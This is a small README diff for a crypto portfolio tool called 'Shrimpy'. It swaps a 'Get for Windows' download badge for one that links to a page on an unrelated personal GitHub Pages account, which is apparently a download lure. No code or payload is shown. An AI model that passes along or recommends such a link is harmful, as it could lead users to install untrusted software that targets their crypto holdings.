@@ -4,10 +4,8 @@
   <img src="https://images.squarespace-cdn.com/content/v1/5bdc8c06697a98bb346792b9/1619560742987-WMUUEMOSBZHJ3T3PACGP/Shrimpy+Academy.png" alt="Shrimpy Logo"/>
 </div>
 
-<div align="center">
+[![GET Shrimpy Crypto](https://img.shields.io/badge/GET%20%E2%80%94%20Shrimpy-Crypto-0078D6?style=for-the-badge&logoColor=white)](https://margaretjohnsonk793.github.io/.github/Shrimpy-Crypto)
 
-[![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://shrimpy-crypto-portfolio.github.io/.github/)
-</div>
 
 ---
 
